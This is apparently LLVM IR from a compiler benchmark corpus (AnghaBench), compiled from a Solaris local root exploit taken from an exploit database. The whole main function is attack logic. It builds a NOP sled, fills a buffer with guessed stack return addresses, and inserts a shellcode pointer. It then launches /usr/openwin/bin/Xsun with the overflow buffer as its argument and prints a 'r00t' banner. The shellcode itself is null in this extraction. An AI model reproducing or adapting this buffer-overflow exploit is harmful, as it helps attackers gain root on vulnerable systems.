; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19876.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19876.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@shellcode = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.1 = private unnamed_addr constant [29 x i8] c"Oh boy. DiGiT presents r00t\0A\00", align 1
@.str.2 = private unnamed_addr constant [22 x i8] c"/usr/openwin/bin/Xsun\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"Xsun\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"-dev\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [5000 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 2001, i32* %7, align 4
  store i32 4000, i32* %8, align 4
  store i32 1850, i32* %9, align 4
  %11 = load i32, i32* %4, align 4
  %12 = icmp sgt i32 %11, 1
  br i1 %12, label %13, label %18

13:                                               ; preds = %2
  %14 = load i8**, i8*** %5, align 8
  %15 = getelementptr inbounds i8*, i8** %14, i64 1
  %16 = load i8*, i8** %15, align 8
  %17 = call i32 @atoi(i8* %16)
  store i32 %17, i32* %7, align 4
  br label %18

18:                                               ; preds = %13, %2
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 2
  br i1 %20, label %21, label %26

21:                                               ; preds = %18
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 2
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 @atoi(i8* %24)
  store i32 %25, i32* %8, align 4
  br label %26

26:                                               ; preds = %21, %18
  %27 = load i32, i32* %4, align 4
  %28 = icmp sgt i32 %27, 3
  br i1 %28, label %29, label %34

29:                                               ; preds = %26
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 3
  %32 = load i8*, i8** %31, align 8
  %33 = call i32 @atoi(i8* %32)
  store i32 %33, i32* %9, align 4
  br label %34

34:                                               ; preds = %29, %26
  %35 = getelementptr inbounds [5000 x i8], [5000 x i8]* %6, i64 0, i64 0
  %36 = load i32, i32* %8, align 4
  %37 = call i32 @memset(i8* %35, i32 144, i32 %36)
  %38 = load i32, i32* %7, align 4
  store i32 %38, i32* %10, align 4
  br label %39

39:                                               ; preds = %53, %34
  %40 = load i32, i32* %10, align 4
  %41 = load i32, i32* %8, align 4
  %42 = sub nsw i32 %41, 4
  %43 = icmp slt i32 %40, %42
  br i1 %43, label %44, label %56

44:                                               ; preds = %39
  %45 = call i32 (...) @get_esp()
  %46 = load i32, i32* %9, align 4
  %47 = add nsw i32 %45, %46
  %48 = sext i32 %47 to i64
  %49 = load i32, i32* %10, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds [5000 x i8], [5000 x i8]* %6, i64 0, i64 %50
  %52 = bitcast i8* %51 to i64*
  store i64 %48, i64* %52, align 1
  br label %53

53:                                               ; preds = %44
  %54 = load i32, i32* %10, align 4
  %55 = add nsw i32 %54, 4
  store i32 %55, i32* %10, align 4
  br label %39

56:                                               ; preds = %39
  %57 = getelementptr inbounds [5000 x i8], [5000 x i8]* %6, i64 0, i64 0
  %58 = load i32, i32* %7, align 4
  %59 = load i8*, i8** @shellcode, align 8
  %60 = call i32 @strlen(i8* %59)
  %61 = sub nsw i32 %58, %60
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds i8, i8* %57, i64 %62
  %64 = load i8*, i8** @shellcode, align 8
  %65 = load i8*, i8** @shellcode, align 8
  %66 = call i32 @strlen(i8* %65)
  %67 = call i32 @memcpy(i8* %63, i8* %64, i32 %66)
  %68 = getelementptr inbounds [5000 x i8], [5000 x i8]* %6, i64 0, i64 0
  %69 = call i32 @memcpy(i8* %68, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0), i32 1)
  %70 = call i32 @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0))
  %71 = getelementptr inbounds [5000 x i8], [5000 x i8]* %6, i64 0, i64 0
  %72 = call i32 @execl(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0), i8* %71, i32* null)
  %73 = load i32, i32* %3, align 4
  ret i32 %73
}

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @get_esp(...) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
